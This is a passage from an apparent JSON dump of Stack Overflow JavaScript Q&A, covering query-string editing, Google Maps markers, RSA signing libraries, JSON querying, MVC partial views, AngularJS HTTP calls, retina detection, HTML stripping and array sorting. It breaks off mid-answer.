                    "body": "<p>*<em>Java script code to find a specific query string and replace its value  *</em></p>\n\n<pre><code>('input.letter').click(function () {\n                //0- prepare values\n                var qsTargeted = 'letter=' + this.value; //\"letter=A\";\n                var windowUrl = '';\n                var qskey = qsTargeted.split('=')[0];\n                var qsvalue = qsTargeted.split('=')[1];\n                //1- get row url\n                var originalURL = window.location.href;\n                //2- get query string part, and url\n                if (originalURL.split('?').length &gt; 1) //qs is exists\n                {\n                    windowUrl = originalURL.split('?')[0];\n                    var qs = originalURL.split('?')[1];\n                    //3- get list of query strings\n                    var qsArray = qs.split('&amp;');\n                    var flag = false;\n                    //4- try to find query string key\n                    for (var i = 0; i &lt; qsArray.length; i++) {\n                        if (qsArray[i].split('=').length &gt; 0) {\n                            if (qskey == qsArray[i].split('=')[0]) {\n                                //exists key\n                                qsArray[i] = qskey + '=' + qsvalue;\n                                flag = true;\n                                break;\n                            }\n                        }\n                    }\n                    if (!flag)//   //5- if exists modify,else add\n                    {\n                        qsArray.push(qsTargeted);\n                    }\n                    var finalQs = qsArray.join('&amp;');\n                    //6- prepare final url\n                    window.location = windowUrl + '?' + finalQs;\n                }\n                else {\n                    //6- prepare final url\n                    //add query string\n                    window.location = originalURL + '?' + qsTargeted;\n                }\n            })\n        });\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Based on this discussion I have created a references function. enjoy</p>\n\n<pre><code>updateUrlParameter(url, param, value){\n    var regex = new RegExp(\"/([?|&amp;]\" + param + \"=)[^\\&amp;]+/\");\n    return url.replace(regex, '$1' + value);\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Based on this discussion I have fixed the Chris function (problem with regex string!)</p>\n\n<pre><code>function updateUrlParameter(url, param, value){\n    var regex = new RegExp('('+param+'=)[^\\&amp;]+');\n    return url.replace( regex , '$1' + value);\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have a string which is something like this :</p>\n\n<pre><code>a_href= \"www.google.com/test_ref=abc\";\n</code></pre>\n\n<p>I need to search for test_ref=abc in thisabove strinng and replace it with new value</p>\n\n<pre><code>var updated_test_ref = \"xyz\";\n\na_href =\"www.google.com/test_ref=updated_test_ref\" \n</code></pre>\n\n<p>i.e </p>\n\n<pre><code>www.google.com/test_ref=xyz.\n</code></pre>\n\n<p>How can we do this ?</p>\n\n<p>EDIT:</p>\n\n<p>test_ref value can be a URL link in itself something like <a href=\"http://google.com?param1=test1&amp;param2=test2\">http://google.com?param1=test1&amp;param2=test2</a>. I need to capture complete value not till first &amp;.  </p>\n",
            "last_activity_date": 1413963659,
            "question_id": 5413899,
            "score": 13,
            "tags": [
                "javascript",
                "search",
                "replace",
                "design-patterns",
                "match"
            ],
            "title": "Search and replace specific query string parameter value in javascript"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Here is the very fancy looking but relatively easy to code sample that made me post this message. </p>\n\n<p><a href=\"http://css-tricks.com/google-maps-slider/\" rel=\"nofollow\" title=\"Google Maps Slider\">Google Map Slider</a>, based on <a href=\"http://hitotoki.org/places/japan/tokyo/\" rel=\"nofollow\">this implementation.</a></p>\n\n<p>Features: auto-scrolling as you hover over an external area with details about what is in the map. Allows you to post and show much more info but still relate it to the map. </p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Here is the documentation for <a href=\"http://google-maps-utility-library-v3.googlecode.com/svn/trunk/markerclusterer/docs/reference.html\">MarkerClusterer for Google Maps V3</a></p>\n\n<p>checkout examples <a href=\"http://google-maps-utility-library-v3.googlecode.com/svn/trunk/markerclusterer/docs/examples.html\">MarkerClusterer  for Google Maps V3 Sample Codes</a></p>\n\n<p>It can group your markers in a way it's easier to view.</p>\n\n<p>Here is an example of using MarkerClusterer <a href=\"http://jsfiddle.net/kjy112/rD8U6/\">JSFiddle Demo.</a></p>\n\n<p>Screenshot of what it looks like grouped:</p>\n\n<p><img src=\"http://i.stack.imgur.com/iW9cD.gif\" alt=\"enter image description here\"></p>\n",
                    "is_accepted": false,
                    "score": 18
                }
            ],
            "body": "<p>I have this map and want to display a whole bunch of markers. But I need to find a way of showing this in an orderly fashion, and well... something <em>cool</em> would be nice. Good thing is that Google Maps has many cool features. But I am new to its use and most likely not aware of cool options to organize markers and content. I just stumbled upon one neat way, which I will post below. </p>\n\n<p>But in order to learn about solutions that others have found / created, my question is: what are cool ways of showing a large group of markers?</p>\n",
            "last_activity_date": 1302956196,
            "question_id": 5413122,
            "score": 13,
            "tags": [
                "javascript",
                "google-maps",
                "google-maps-markers"
            ],
            "title": "Showing many markers in Google Maps"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>This library should help.</p>\n\n<p>website:  <a href=\"http://www.ohdave.com/rsa/\" rel=\"nofollow\">http://www.ohdave.com/rsa/</a>\nlibrary:  <a href=\"http://www.ohdave.com/rsa/RSA.js\" rel=\"nofollow\">http://www.ohdave.com/rsa/RSA.js</a></p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>I've done it in <a href=\"http://stackoverflow.com/a/21531105/698168\">JavaScript for the client-side and Java for the server-side</a>. This is based on <a href=\"http://travistidwell.com/blog/2013/02/15/a-better-library-for-javascript-asymmetrical-rsa-encryption/\" rel=\"nofollow\">Travis Tidwell's implementation</a>.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am looking for a JS crypto lib (similar to, say, OpenSSL's libcrypto) that facilitates digital signing of data in the browser.<br>\nI want to sign form form data on the client side using a private key (RSA, PKI certificates or similar).</p>\n\n<p>EXAMPLE</p>\n\n<ol>\n<li>Form data loads in browser</li>\n<li>User A reviews data and signs it => the signature is created in the browser using the js lib and the private key <code>signature=RSA_encrypt(A_private_key, hash(data))</code></li>\n<li><p>The form data and signature is sent to the server and stored  </p></li>\n<li><p>Another user (B) can check the validity of the signature by comparing <code>hash(data)</code> with <code>RSA_decrypt(A_public_key, signature)</code> If someone alters the form data the signature will no longer be valid.</p></li>\n</ol>\n\n<p>EDIT</p>\n\n<p><a href=\"https://developer.mozilla.org/en/javascript_crypto\">https://developer.mozilla.org/en/javascript_crypto</a><br>\n<a href=\"http://www.hanewin.net/encrypt\">http://www.hanewin.net/encrypt</a><br>\n<a href=\"http://tomas.styblo.name/cryptoapplet/\">http://tomas.styblo.name/cryptoapplet/</a>  </p>\n\n<p>VIA APPLETS<br>\n<a href=\"http://stackoverflow.com/questions/3047437/best-way-to-sign-data-in-web-form-with-user-certificate\">Best way to sign data in web form with user certificate</a><br>\n! => <a href=\"http://www.nakov.com/research/documents-signing/digital-document-signing-in-java-based-web-applications/\">http://www.nakov.com/research/documents-signing/digital-document-signing-in-java-based-web-applications/</a><br>\n<a href=\"http://www.nakov.com/research/documents-signing/\">http://www.nakov.com/research/documents-signing/</a><br>\n<a href=\"http://www.developer.com/java/other/article.php/10936_3587361_1\">http://www.developer.com/java/other/article.php/10936_3587361_1</a><br>\n<a href=\"http://www.developer.com/java/web/article.php/3083161\">http://www.developer.com/java/web/article.php/3083161</a><br>\n<a href=\"http://blogs.nologin.es/rickyepoderi/index.php?/archives/12-Signature-Applet.html\">http://blogs.nologin.es/rickyepoderi/index.php?/archives/12-Signature-Applet.html</a>  </p>\n\n<p>RELATED<br>\n<a href=\"http://ccff02.minfin.fgov.be/CCFF_Authentication/views/login/signature/signatureHelp.html\">http://ccff02.minfin.fgov.be/CCFF_Authentication/views/login/signature/signatureHelp.html</a><br>\n<a href=\"http://msdn.microsoft.com/en-us/library/cc778518%28VS.85%29.aspx\">http://msdn.microsoft.com/en-us/library/cc778518%28VS.85%29.aspx</a>  </p>\n",
            "last_activity_date": 1391441260,
            "question_id": 4176574,
            "score": 13,
            "tags": [
                "javascript",
                "encryption",
                "rsa",
                "token",
                "signing"
            ],
            "title": "Javascript cryptography library to sign form data in browser"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>Definitely would be a useful utility.</p>\n\n<p>My opinion is that the best way to approach this would be to stay as similar as possible to css selectors, as you indicate. I'd recommend looking under the hood at <a href=\"http://jquery.com\" rel=\"nofollow\">jquery</a>'s implementation of selectors.</p>\n\n<p>I would suggest something like</p>\n\n<pre><code>var banana = object.function(jsonObect, \"holding #Banana\");\nvar leftHands = object.function(jsonObject, \"appendage[type=hand][side=left]\");\n</code></pre>\n\n<p>instead of your usage examples.</p>\n\n<p>I'm not sure how the upcoming <a href=\"https://developer.mozilla.org/En/Using%5FJSON%5Fin%5FFirefox\" rel=\"nofollow\">native json support</a> will affect this...</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Dojo's dojo.getObject has a facility that works <strong>loosely</strong> like this, where you can provide a path like \"a.b.c\" to the property you want to fetch.</p>\n\n<p>Check it out:</p>\n\n<p><a href=\"http://api.dojotoolkit.org/jsdoc/1.3/dojo.getObject\" rel=\"nofollow\">http://api.dojotoolkit.org/jsdoc/1.3/dojo.getObject</a></p>\n\n<p>I don't think it understands arrays quite that well and I think it is missing a full-featured selector language like the one you are suggesting. </p>\n\n<p>As for usage, I've coded a selector language like the one you are suggesting, but for a client, and array addressing is very proprietary to their particular object structure.</p>\n\n<p>I would <em>definitely</em> use a system like this if you were to make it, and perhaps even contribute if I saw an area I could help with.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>OK, I have created a prototype for this, available here:  <a href=\"http://code.google.com/p/jfunk/\" rel=\"nofollow\">http://code.google.com/p/jfunk/</a></p>\n\n<p>It has already proven useful for me, so I will probably slowly improve and refactor it into something nice.  But if I get good feedback, I can move more quickly.  I would also welcome help.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Check out <a href=\"http://jsonselect.org\">http://jsonselect.org</a></p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>Try to using JSPath -- <a href=\"https://github.com/dfilatov/jspath\" rel=\"nofollow\">https://github.com/dfilatov/jspath</a>.</p>\n\n<p>JSPath is a domain-specific language (DSL) that enables you to navigate and find data within your JSON documents. Using JSPath, you can select items of JSON in order to retrieve the data they contain.</p>\n\n<p>JSPath for JSON like an XPath for XML.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I just wrote a clientside JS-lib that does just this - it makes it possible to query a JSON structure with XPath.\n<br/><br/></p>\n\n<p>@jlarson - with \"defiant.js\", you can query your JSON structure like this (this lib extends the global JSON object):</p>\n\n<pre><code>JSON.search( Characters, '//*[id=\"Banana\"]' );\n</code></pre>\n\n<p><br/><br/>\nThis call will return an array with matching nodes AND those matches won't be detached from your original JSON object (same behaviour as when working with XML + XPath). To illustrate what I mean, here is a little pseudo(-ish) code:</p>\n\n<pre><code>var store = {\n    \"book\": [\n        {\n            \"id\": 1,\n            \"price\": 8.95,\n            \"title\": \"Sayings of the Century\",\n            \"category\": \"reference\",\n            \"author\": \"Nigel Rees\"\n        },\n        {\n            \"id\": 2,\n            \"price\": 22.99,\n            \"title\": \"The Lord of the Rings\",\n            \"category\": \"fiction\",\n            \"author\": \"J. R. R. Tolkien\",\n            \"isbn\": \"0-395-19395-8\"\n         }\n    ]\n};\n\nvar b1 = JSON.search( store, '//book[1]' );\nb1[0].isbn = '12345';\n\nconsole.log( store.book[0].isbn );\n// 12345\n</code></pre>\n\n<p>This lib is thus far for browser and clientside but I've plans to re-write it for NodeJS eventually. Check out the Xpath evaluator here; that demonstrates the functionality. There are also pre-written Xpath expressions as well:</p>\n\n<p><a href=\"http://defiantjs.com/#xpath_evaluator\" rel=\"nofollow\">http://defiantjs.com/#xpath_evaluator</a></p>\n\n<p>You can find the lib at Github:<br/>\n<a href=\"https://github.com/hbi99/defiant.js\" rel=\"nofollow\">https://github.com/hbi99/defiant.js</a></p>\n\n<p>Finally, there is a little more functionality in \"defiant.js\" and if you're interested, you'll hopefully read about it over there (<a href=\"http://defiant.com\" rel=\"nofollow\">http://defiant.com</a>)</p>\n\n<p>I hope you'll find it useful.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Looks like there's a new option:  <a href=\"https://github.com/wilhelm-murdoch/jQuery-JSONPath\" rel=\"nofollow\">jQuery-JSONPath</a>.  Seems to be exactly what you're asking for.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I have been looking at JSONPath and though it seems pretty well done, I wonder if anyone has worked with it and can comment on its usability, or can recommend alternatives?  What would be <em>really</em> slick is if there was a plugin for JQuery that did something like this.  I have been searching the plugins and coming up empty handed.  Anyway, before I spend time getting to know JSONPath (which has some aspects I am not keen on), or before I reinvent wheels, I thought I'd see if anyone had an angle on this...</p>\n\n<p>To give you an idea what I mean, imagine this Javascript object:</p>\n\n<pre><code>var Characters=[\n        {\n            id: \"CuriousGeorge\",\n            species:\"Monkey\",\n            mood: \"curious\",\n            appendage: [\n                { \n                    type: \"hand\",\n                    side: \"left\",\n                    holding: [ \n                        { id: \"Banana\" } \n                    ]\n                },\n                { \n                    type: \"hand\",\n                    side: \"right\",\n                    holding: []\n                }, \n                { \n                    type: \"foot\",\n                    side: \"left\",\n                    holding: []\n                },\n                { \n                    type: \"foot\",\n                    side: \"right\",\n                    holding: [ \n                        { id: \"YellowHat\" },\n                        { id: \"Keys\" }\n                    ]\n                }\n            ]\n        },\n        {\n            id: \"ManInYellowHat\",\n            species: \"Human\",\n            mood: \"angry\",\n            //...ok, you get it...\n        }\n    ]\n</code></pre>\n\n<p>Wouldn't it be great to get to of some of the deeper objects by something like Jquery selectors?</p>\n\n<pre><code>var banana=SomeUtility(\"Characters holding #Banana\").get(0);\nvar leftHands=SomeUtility(\"Characters appendage[type=hand][side=left]\").get();\n</code></pre>\n\n<p>(This may qualify for worlds corniest code example, but hey, my kids just watched this.  And I can't use real example because of NDA...)</p>\n\n<p>...And, to make it more interesting, if I were to create such a thing, would anyone use it?</p>\n",
            "last_activity_date": 1408459983,
            "question_id": 859033,
            "score": 13,
            "tags": [
                "javascript",
                "jquery",
                "json",
                "jsonpath"
            ],
            "title": "JSONPath or other XPath like utility for JSON/Javascript; or Jquery JSON"
        },
        {
            "answer_count": 9,
            "answers": [
                {
                    "body": "<p>Include a place holder in your master template:</p>\n\n<pre><code>&lt;head runat=\"server&gt;\n    &lt;asp:ContentPlaceHolder ID=\"head\" runat=\"server\" /&gt;\n&lt;/head&gt;\n</code></pre>\n\n<p>and in your control</p>\n\n<pre><code>&lt;asp:Content ID=\"head\" runat=\"server\"&gt;\n    &lt;script src=\"something.js\"&gt;&lt;/script&gt;\n&lt;/asp:Content&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": -2
                },
                {
                    "body": "<p>If you willing to break conformance, you can just emit a style definition with the partial content.  This tends to work in most recent browsers.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Depending on how much CSS / JS your control needs, the safest route may be just to include the extra styling in your main CSS files.  Saves an extra trip to the server, and it should all be cached by the client.  I know this kills the self-containedness (to coin a phrase) of the control, but it may be your best bet.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Sorry, you cannot from a partial control refer \"up\" to something in the parent page (or add anything). The only communication is \"down\" from the parent to the partial by passing the ViewData / Model.</p>\n\n<p>You are describing functionality of a master page and a normal page using the content place holders, but partial controls do not function like that.</p>\n\n<p>But, if I am not mistaken, you can just physically add the script or link tags to the actual parent page that you render the partial page on - the CSS should be used by the partial page as well.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>If I have requirements for CSS/Javascript in a partial view, I simply make sure that any page that may include the partial view, either directly or as content retrieved from AJAX, has the CSS/Javascript included in it's headers.  If the page has a master page, I add a content placeholder in the master page header and populate it in the child page.  To get intellisense in the partial view, I add the CSS/Javascript includes in the partial view but wrapped with an <code>if (false)</code> code block so they are not included at runtime.</p>\n\n<pre><code>&lt;% if (false) { %&gt;\n   &lt;link href=...\n   &lt;script type=...\n&lt;% } %&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>Todd's answer works fine, provided you have only one instance of the control and there's no other code that wants to \"inject\" anything in the  tag for the master page. Unfortunately, you can rarely rely on this.</p>\n\n<p>I would suggest you include the all the css files you need in the master page. There will be a small perf hit on the first visit, but after that the browser caching will kick in. You can (and should) split your styles in multiple .css files to benefit from HTTP agents that can downoad them concurently. As for the .js files, I'd suggest to implement something close to the <code>google.load()</code> mechanism, that would allow you to load scripts on demand.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Before the render partial line, call <code>@import</code> as follows:</p>\n\n<pre><code>&lt;style type=\"text/css&gt;\n    @import url(cssPath.css);\n&lt;/style&gt;\n</code></pre>\n\n<p>Hope this helps.</p>\n\n<hr>\n\n<p><a href=\"http://haacked.com/archive/2009/01/27/controls-collection-cannot-be-modified-issue-with-asp.net-mvc-rc1.aspx\" rel=\"nofollow\">Just came across this option on Haacked</a> and remembered your question. Use the header's <code>Content</code> placeholder on the partial view and just add the CSS to that form normally.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p><a href=\"http://www.codeproject.com/Articles/38542/Include-Stylesheets-and-Scripts-From-A-WebControl-.aspx\" rel=\"nofollow\">http://www.codeproject.com/Articles/38542/Include-Stylesheets-and-Scripts-From-A-WebControl-.aspx</a></p>\n\n<p>This article contains information about overriding HttpContext.Response.Filter which worked great for me.</p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>I am new to MVC... I had the challenge recently. I used MVC View Page instead of partial view, added its own master page (because I have a css which are shared across multiple views) and added css to master. Hope this info helps.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm using ASP.NET MVC and I have a partial control that needs a particular CSS &amp; JS file included.  Is there a way to make the parent page render the <code>script</code> and <code>link</code> tags in the 'head' section of the page, rather than just rendering them inline in the partial contol?</p>\n\n<p>To clarify the control that I want to include the files from is being rendered from a View with <code>Html.RenderPartial</code> and so cannot have server-side content controls on it. I want to be able to include the files in the html <code>head</code> section so as to avoid validation issues.</p>\n",
            "last_activity_date": 1347916621,
            "question_id": 370060,
            "score": 13,
            "tags": [
                "javascript",
                "asp.net-mvc",
                "css"
            ],
            "title": "How can I include css files from an MVC partial control?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>First, your <code>success()</code> handler just returns the data, but that's not returned to the caller of <code>getData()</code> since it's already in a callback.  <code>$http</code> is an asynchronous call that returns a <code>$promise</code>, so you have to register a callback for when the data is available.</p>\n\n<p>I'd recommend looking up Promises and the <a href=\"http://docs.angularjs.org/api/ng.%24q\">$q library</a> in AngularJS since they're the best way to pass around asynchronous calls between services.</p>\n\n<p>For simplicity, here's your same code re-written with a function callback provided by the calling controller:</p>\n\n<pre><code>var myApp = angular.module('myApp',[]);\n\nmyApp.service('dataService', function($http) {\ndelete $http.defaults.headers.common['X-Requested-With'];\nthis.getData = function(callbackFunc) {\n    $http({\n        method: 'GET',\n        url: 'https://www.example.com/api/v1/page',\n        params: 'limit=10, sort_by=created:desc',\n        headers: {'Authorization': 'Token token=xxxxYYYYZzzz'}\n     }).success(function(data){\n        // With the data succesfully returned, call our callback\n        callbackFunc(data);\n    }).error(function(){\n        alert(\"error\");\n    });\n }\n});\n\nmyApp.controller('AngularJSCtrl', function($scope, dataService) {\n    $scope.data = null;\n    dataService.getData(function(dataResponse) {\n        $scope.data = dataResponse;\n    });\n});\n</code></pre>\n\n<p>Now, <code>$http</code> actually already returns a $promise, so this can be re-written:</p>\n\n<pre><code>var myApp = angular.module('myApp',[]);\n\nmyApp.service('dataService', function($http) {\ndelete $http.defaults.headers.common['X-Requested-With'];\nthis.getData = function() {\n    // $http() returns a $promise that we can add handlers with .then()\n    return $http({\n        method: 'GET',\n        url: 'https://www.example.com/api/v1/page',\n        params: 'limit=10, sort_by=created:desc',\n        headers: {'Authorization': 'Token token=xxxxYYYYZzzz'}\n     });\n }\n});\n\nmyApp.controller('AngularJSCtrl', function($scope, dataService) {\n    $scope.data = null;\n    dataService.getData().then(function(dataResponse) {\n        $scope.data = dataResponse;\n    });\n});\n</code></pre>\n\n<p>Finally, there's better ways to configure the <code>$http</code> service to handle the headers for you using <code>config()</code> to setup the <code>$httpProvider</code>.  Checkout the <a href=\"http://docs.angularjs.org/api/ng.%24http\">$http documentation</a> for examples.</p>\n",
                    "is_accepted": true,
                    "score": 33
                },
                {
                    "body": "<p>I suggest you use Promise</p>\n\n<pre><code>myApp.service('dataService', function($http,$q) {\n\n  delete $http.defaults.headers.common['X-Requested-With'];\n  this.getData = function() {\n     deferred = $q.defer();\n     $http({\n         method: 'GET',\n         url: 'https://www.example.com/api/v1/page',\n         params: 'limit=10, sort_by=created:desc',\n         headers: {'Authorization': 'Token token=xxxxYYYYZzzz'}\n     }).success(function(data){\n         // With the data succesfully returned, we can resolve promise and we can access it in controller\n         deferred.resolve();\n     }).error(function(){\n          alert(\"error\");\n          //let the function caller know the error\n          deferred.reject(error);\n     });\n     return deferred.promise;\n  }\n});\n</code></pre>\n\n<p>so In your controller you can use the method</p>\n\n<pre><code>myApp.controller('AngularJSCtrl', function($scope, dataService) {\n    $scope.data = null;\n    dataService.getData().then(function(response) {\n        $scope.data = response;\n    });\n});\n</code></pre>\n\n<p>promises are powerful feature of angularjs and it is convenient special if you want to avoid nesting callbacks. </p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have the following code in the controller.js, </p>\n\n<pre><code>var myApp = angular.module('myApp',[]);\n\nmyApp.service('dataService', function($http) {\ndelete $http.defaults.headers.common['X-Requested-With'];\nthis.getData = function() {\n    $http({\n        method: 'GET',\n        url: 'https://www.example.com/api/v1/page',\n        params: 'limit=10, sort_by=created:desc',\n        headers: {'Authorization': 'Token token=xxxxYYYYZzzz'}\n     }).success(function(data){\n         return data\n    }).error(function(){\n        alert(\"error\");\n    });\n }\n});\n\nmyApp.controller('AngularJSCtrl', function($scope, dataService) {\n  $scope.data = dataService.getData();\n});\n</code></pre>\n\n<p>But, I think I m probably making a mistake with CORS related issue. Can you please point me to the correct way to make this call? Thanks much!</p>\n",
            "last_activity_date": 1411419808,
            "question_id": 20369377,
            "score": 12,
            "tags": [
                "javascript",
                "http",
                "angularjs",
                "get",
                "cors"
            ],
            "title": "How to use HTTP.GET in AngularJS correctly? In specific, for an external API call?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>if you want it for images you can use this <a href=\"http://retinajs.com/\">http://retinajs.com/</a> or this is a common response to detect it</p>\n\n<pre><code>function isRetinaDisplay() {\n        if (window.matchMedia) {\n            var mq = window.matchMedia(\"only screen and (min--moz-device-pixel-ratio: 1.3), only screen and (-o-min-device-pixel-ratio: 2.6/2), only screen and (-webkit-min-device-pixel-ratio: 1.3), only screen  and (min-device-pixel-ratio: 1.3), only screen and (min-resolution: 1.3dppx)\");\n            if (mq &amp;&amp; mq.matches || (window.devicePixelRatio &gt; 1)) {\n                return true;\n            } else {\n                return false;\n            }\n        }\n    }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>According to everything that I've read recently, browsers seem to be moving towards the <code>resolution</code> media query expression. This is instead of <code>device-pixel-ratio</code> that is being used in the currently accepted answer. The reason why <code>device-pixel-ratio</code> should only be used as a fallback is because it is not a standard media query.</p>\n\n<p>According to w3.org:</p>\n\n<blockquote>\n  <p>Once upon a time, Webkit decided a media query for the screen resolution was needed. But rather than using the already-standardized resolution media query, they invented -webkit-device-pixel-ratio. </p>\n</blockquote>\n\n<p><a href=\"http://www.w3.org/blog/CSS/2012/06/14/unprefix-webkit-device-pixel-ratio/\">View Full Article</a></p>\n\n<p><a href=\"http://www.w3.org/TR/css3-mediaqueries/#resolution\">Resolution Media Query Documentation</a></p>\n\n<p>Since <code>resolution</code> is standardized and therefore the future let's use that first in the detection for future proofing. Also because I'm not sure if you want to detect only high dppx devices or <strong>only</strong> <em>retina</em>(Apple only) devices, I've added one of each. Finally just as a note, the Apple detection is just user agent sniffing so can't be <em>depended</em> on. Note: for the <code>isRetina</code> function I'm using a dppx of 2 instead of 1.3 because all retina apple devices have a 2dppx.</p>\n\n<pre><code>function isHighDensity(){\n    return ((window.matchMedia &amp;&amp; (window.matchMedia('only screen and (min-resolution: 124dpi), only screen and (min-resolution: 1.3dppx), only screen and (min-resolution: 48.8dpcm)').matches || window.matchMedia('only screen and (-webkit-min-device-pixel-ratio: 1.3), only screen and (-o-min-device-pixel-ratio: 2.6/2), only screen and (min--moz-device-pixel-ratio: 1.3), only screen and (min-device-pixel-ratio: 1.3)').matches)) || (window.devicePixelRatio &amp;&amp; window.devicePixelRatio &gt; 1.3));\n}\n\n\nfunction isRetina(){\n    return ((window.matchMedia &amp;&amp; (window.matchMedia('only screen and (min-resolution: 192dpi), only screen and (min-resolution: 2dppx), only screen and (min-resolution: 75.6dpcm)').matches || window.matchMedia('only screen and (-webkit-min-device-pixel-ratio: 2), only screen and (-o-min-device-pixel-ratio: 2/1), only screen and (min--moz-device-pixel-ratio: 2), only screen and (min-device-pixel-ratio: 2)').matches)) || (window.devicePixelRatio &amp;&amp; window.devicePixelRatio &gt; 2)) &amp;&amp; /(iPad|iPhone|iPod)/g.test(navigator.userAgent);\n}\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 12
                }
            ],
            "body": "<p>Right now I am using this:</p>\n\n<pre><code>function is_retina_device() {\n    return window.devicePixelRatio &gt; 1;\n}\n</code></pre>\n\n<p>But it's simplicity scares me. Is there is a more thorough check?</p>\n",
            "last_activity_date": 1386302081,
            "question_id": 19689715,
            "score": 12,
            "tags": [
                "javascript",
                "jquery",
                "retina-display"
            ],
            "title": "What is the best way to detect retina support on a device using JavaScript?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Use this function like</p>\n\n<pre><code> function htmlDecode(value) {\n    return $('&lt;div/&gt;').html(value).text();\n }\n\n  $(\"#mydiv\").text(htmlDecode(\"&lt;span&gt;My text&lt;/span&gt;\"));\n\n  output:\n  My text\n</code></pre>\n\n<p><strong><a href=\"http://jsfiddle.net/zVMHK/\" rel=\"nofollow\">Fiddle</a></strong></p>\n",
                    "is_accepted": false,
                    "score": -5
                },
                {
                    "body": "<p><a href=\"http://jsperf.com/strip-html-jquery-vs-pure-js\"><strong>jQuery is about 40 times SLOWER</strong>, please do not use jQuery for that simple task.</a></p>\n\n<pre><code>function htmlToPlaintext(text) {\n  return String(text).replace(/&lt;[^&gt;]+&gt;/gm, '');\n}\n</code></pre>\n\n<p>usage :</p>\n\n<pre><code>var plain_text = htmlToPlaintext( your_html );\n</code></pre>\n\n<hr>\n\n<h3>With angular.js :</h3>\n\n<pre><code>angular.module('myApp.filters', []).\n  filter('htmlToPlaintext', function() {\n    return function(text) {\n      return String(text).replace(/&lt;[^&gt;]+&gt;/gm, '');\n    }\n  }\n);\n</code></pre>\n\n<p>use : </p>\n\n<pre><code>&lt;div&gt;{{myText | htmlToPlaintext}}&lt;/div&gt;  \n</code></pre>\n",
                    "is_accepted": true,
                    "score": 52
                },
                {
                    "body": "<p>from <a href=\"https://docs.angularjs.org/api/ng/function/angular.element\" rel=\"nofollow\">https://docs.angularjs.org/api/ng/function/angular.element</a></p>\n\n<blockquote>\n  <p><strong>angular.element</strong></p>\n  \n  <p>wraps a raw DOM element or HTML string as a jQuery element (If jQuery\n  is not available, angular.element delegates to Angular's built-in\n  subset of jQuery, called \"jQuery lite\" or \"jqLite.\")</p>\n</blockquote>\n\n<p>So you simple could do:</p>\n\n<pre><code>angular.module('myApp.filters', []).\n  filter('htmlToPlaintext', function() {\n    return function(text) {\n      return angular.element(text).text();\n    }\n  }\n);\n</code></pre>\n\n<p>Usage:</p>\n\n<pre><code>&lt;div&gt;{{myText | htmlToPlaintext}}&lt;/div&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I have some text like this:</p>\n\n<pre><code>&lt;span&gt;My text&lt;/span&gt;\n</code></pre>\n\n<p>I want to display without tags:</p>\n\n<pre><code>My text\n</code></pre>\n\n<p>I also don't want to apply the tags, I want to strip them. What's an easy way to do that?</p>\n\n<p>Angular html:</p>\n\n<pre><code>&lt;div&gt;{{myText | htmlToPlaintext}}&lt;/div&gt;\n</code></pre>\n",
            "last_activity_date": 1401910903,
            "question_id": 17289448,
            "score": 12,
            "tags": [
                "javascript",
                "html",
                "angularjs"
            ],
            "title": "angularjs to output plain text instead of html"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>By default, the array <code>sort()</code> method sorts alphabetically ascending. If you want to sort in some other order, because your array contains numbers or objects then you can pass a function in to the <code>sort()</code>.</p>\n\n<p>The function you pass in takes two parameters, often called a and b, and returns:\n  a negative number if the first argument should be sorted before the second (a &lt; b)\n  0 if the arguments are equal (a==b)\n  a positive number if the first argument should be sorted after the second (a > b)</p>\n\n<p>Now, <strong>here is the key bit</strong>: the function you pass as a parameter to <code>sort()</code> will be called repeatedly by <code>sort()</code> as it processes the whole array. <code>sort()</code> doesn't know or care about the datatype of the things in the array: each time it needs to know \"Does item A come before item B?\" it just calls your function. You don't need to worry about what type of sort algorithm is used internally by <code>sort()</code>, indeed one browser might use a different algorithm to another, but that's OK because you just have to provide a way for it to compare any two items from your array.</p>\n\n<p>Your function could have an <code>if / else if / else</code> structure to decide what result to return, but for numbers simply returning (a-b) will achieve this for you because the result of the subtraction will be -ve, 0 or +ve and correctly put the numbers in ascending order. Returning (b-a) would put them descending:</p>\n\n<pre><code>  var 